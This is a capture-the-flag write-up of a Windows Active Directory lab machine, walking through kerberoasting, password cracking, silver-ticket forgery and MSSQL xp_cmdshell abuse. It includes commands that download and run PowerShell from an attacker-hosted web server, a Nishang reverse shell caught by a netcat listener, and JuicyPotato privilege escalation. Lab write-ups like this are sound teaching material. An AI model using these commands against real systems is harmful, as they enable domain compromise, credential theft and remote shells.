# Summary

Scrambled was a medium Windows box which uniquely had NTLM authentication disabled throughout the domain, so all authentications had to be done via kerberos. Enumeration involved a website leaking some information about a user and how passwords were rest. From here I can access a share to read a pdf file. I'll kerberoast the MSSQL service to obtain the password to logon to the MSSQL instance. With this password I can create a silver ticket to allow me admin level access to the MSSQL instance. I'll enumerate the database to get a password for `miscsvc` who holds the user flag. I can also execute commands through MSSQL's built-in `xp_cmdshell` functionality. I'll use this to return  me a reverse shell as the `sqlsvc` user who has the `SeImpersonatePrivilege`. With this I can use JuicyPotatoNG.exe to get a system shell.

<details open>
<summary></summary>
  
* [External Enumeration](#external-enumeration)
* [Kerberoasting and Silver Ticket](#kerberoasting-and-silver-ticket-attack)
* [Initial Access](#initial-access)
* [Privilege Escalation](#privilege-escalation)

</details>
  
## External Enumeration

We'll first run a portscan against the target 10.10.11.168, here I'm using my bash alias `fscan`

`fscan 10.10.11.168`

<img src="Images/Ports.png" width=600>

We see all the typical open ports of a domain controller and the nmap scan reveal the FQDN of the domain controller: **dc1.scrm.local**

I'll add **scrm.local** and **dc1.scrm.local** to my `/etc/hosts` file

Usually I'd start with quickly checking for unauthenticated access to SMB or RPC using 
```
smbclient -N -L \\10.10.11.168
crackmapexec smb 10.10.11.168 -u '' -p ''
smbmap -H 10.10.11.168
rpcclient 10.10.11.168 -N
```
but all receieve <b>NT_STATUS_NOT_SUPPORTED</b> errors, the reason for which we discover upon navigating to the website

<img src="Images/NTLM.png" width=600>

It appears NTLM authentication has been disabled across the domain, so any authentications will have to use Kerberos.

Exploring the page further reveals a further two items of interest:

- We have a potential username of **ksimpson**

<img src="Images/KSimpson.png" width=600>

- Passwords are being reset as the username of the account

<img src="Images/PasswordReset.png" width=600>

From here we can do two things:

1. Use kerbrute to verify that ksimpson is in fact a domain user
2. Authenticate using kerberos to see if I can access any shares over SMB using the credentials ksimpson:ksimpson

I'll use `kerbrute` for the former and impacket's `smbclient.py` for the latter.

Kerbrute's userenum works by sending a request for a TGT, and if **UF_DONT_REQUIRE_PREAUTH** is not set for this user (which it usually isn't) the DC will respond with either

1. A PRINCIPAL UNKNOWN error and the username does not exist
2. Or the DC will prompt for pre-authentication, in which case the user exists in the domain

The command line for this looks like 

<img src="Images/Kerbrute.png" width=600>

and we see **ksimpson** is a valid username

Next we check `smb` using the `-k` flag to enforce kerberos authentication

<img src="Images/smbclient.png" width=600>

Enumerating all the shares we find we only have access to the `Public` share which contains a single file **Network Security Changes.pdf**

<img src="Images/pdf.png" width=600>

## Kerberoasting and Silver Ticket Attack

The pdf points to a SQL Service active in the domain. A common attack vector regarding services in active directory is **kerberoasting**, and the tool of choice for this is impacket's `GetSPNUser.py`. The way this works is that each instance of a service in active directory has to be tied to a unique logon account through a **Service Principal Name** (SPN), so an SPN is just an account<--->service mapping. Since the KDC doesn't verify if we have sufficient privilege to access the service (it's left up to the service to do this), we can request a TGS from the KDC for any and every service. The server portion of the TGS is encrypted with a key derived from the password hash of the user account tied to the service in the SPN, so we can offline brute force the password for the account by guessing a password, hashing it and seeing if it will correctly decrypt the server portion of the TGS.

Running the command returns a response for the MSSQLSvc user

<img src="Images/GetUserSPN.png" width=800>

Saving the blob into a file `hash` and using my alias `j hash` we find the credentials **MSSQLSvc:Pegasus60**

<img src="Images/john.png" width=600>

Though the PAC in the server portion of the TGS is signed using the KDC long-term secret AND the target service long-term secret, a TGS is rarely passed off to the KDC for PAC validation. As a result, since we have the MSSQLSvc password, we can forge our own TGS for the service. This is known as a silver ticket attack.

We need three things to do this:
1. The domain SID
2. The NT hash of the password for the service account
3. The SPN

For the NT hash we can do 
`iconv -f ASCII -t UTF-16LE <(printf "Pegasus60") | openssl dgst -md4`
which returns **b999a16500b87d17ec7f2e2a68778f05**

We have the SPN already which is **MSSQLSvc/dc1.scrm.local**

And to get the domain SID, impacket has a script `GetPAC.py` which retrieves the PAC of any user in the domain and the PAC contains the SID of that user, so stripping of that user's RID we have the domain SID.

Running this script targeting the administrator (which always has RID 500) 

<img src="Images/getpac.png" width=600>

We get a domain SID of 

<img src="Images/sid.png" width=400>

Now we can use impacket's `ticketer.py` to forge our TGS, identifying ourselves as the administrator to the MSSQL service

<img src="Images/silverticket.png" width=750>

This saves the ticket into `administrator.ccache`
From <https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html>

'A credential cache (or ???ccache???) holds Kerberos credentials while they remain valid and, generally, while the user???s session lasts, so that authenticating to a service multiple times (e.g., connecting to a web or mail server more than once) doesn???t require contacting the KDC every time.'

## Initial Access

Now we can authenticate to the SQL server as the administrator which should let us do some interesting stuff. Impacket has a script `mssqlclient.py` which will let us authenticate to the service using our forged ticket. 

On Linux, kerberos looks for tickets in pre-defined locations, one being the environment variable `KRB5CCNAME` so I'll need to export the ticket to this environment variable.
I'll run 
1. `export KRB5CCNAME=~/administrator.ccache`
2. `mssqlclient.py -k scrm.local/admnistrator@dc1.scrm.local -no-pass` to enter a session on the SQL server

<img src="Images/mssqlclient.png" width=700>

First I'll enumerate the database:

<img src="Images/sysdatabases.png" width=400>
<img src="Images/tables.png" width=400>
<img src="Images/miscsvc.png" width=550>

We find an account `miscsvc` with password `ScrambledEggs9900`

Next I'll run `enable_xp_cmdshell` followed by `xp_cmdshell whoami /priv` to enumerate my privileges

<img src="Images/priv.png" width=400>

I notice the sqlsvc user has the `SeImpersonatePrivilege` which is typical of a lot of service accounts and is a very dangerous (useful!) privilege to have for privilege escalation.

First though I'll see what I can do with the `miscsvc` account

To do this I'll locally host a `.ps1` script on a python webserver containing the commands I want execute, then retrieve and execute this script from the MSSQL shell. 

My `.ps1` script will look like
```
$User=miscsvc
$Password=ScrambledEggs9900
$SecurePassword=ConvertTo-SecureString $Password -AsPlaintext -Force
$Credential = New-Object System.Management.Automation.PSCredential($User,$SecurePassword)
Invoke-Command -Computername DC1 -Credential $Credential -Scriptblock { whoami }
```
replacing `whoami` with whatever command I want to execute as `miscsvc`

From the MSSQL shell I'll use the command:
`xp_cmdshell powershell Invoke-Expression(Invoke-WebRequest http://10.10.14.43/command.ps1 -UseBasicParsing)` which will retrieve the file from my webserver and `Invoke-Expression` will execute the command immediately in memory so nothing touches disk.

On the webserver I get a hit

<img src="Images/server.png" width=400>

which returns the result of `whoami` as `scrm\miscsvc`

<img src="Images/command.png" width=600>

From here I can get the user flag by changing `whoami` to `cat c:\users\miscsvc\desktop\user.txt` in the scriptblock:

<img src="Images/user.png" width=500>

## Privilege Escalation

Now I'll get a shell on the box as `sqlsvc` so that I can ~~exploit~~ use `SeImpersonatePrivilege`

To do this I'll run `rlwrap nc -nvlp 8000` to start a netcat listener on port 8000, while hosting Nishang's `Invoke-PowerShellTcp.ps1` reverse shell on a webserver then execute `xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.43/Invoke-PowerShellTcp.ps1')` from the MSSQL instance. 

<img src="Images/shell.png" width=500>

then I'll `cd` into my home directory `C:\Users\sqlsvc` which I have write permissions over. Next I'll download JuicyPotato.exe from github and transfer it into my home directory on the target, saving it as `jp.exe`.

<img src="Images/jp.png" width=500>

Now I'll create `shell.bat` on my local box containing the base64 encoded nishang reverse shell to send me a reverse shell on port 9001 by running the commands
```
??????PS> $Data = get-content ./Invoke-PowerShellTcp.ps1 
??????PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
??????PS> $EncodedData = [Convert]::ToBase64String($Bytes)                                        
??????PS> $EncodedData | Out-File shell.bat                                                                                                                   
```
in the linux powershell console, and prepending `powershell -EncodedCommand ` to `shell.bat`. A `.bat` file will be executed immediately upon opening. Next I'll transfer the bat file to the target in the usual way, saving it as `C:\Users\sqlsvc\shell.bat`.
Then I'll run 

<img src="Images/success.png" width=500>

and on my listener I get a hit

<img src="Images/whoami.png" width=500>

and from here I can get the root flag in `C:\Users\Administrator\Desktop\root.txt`
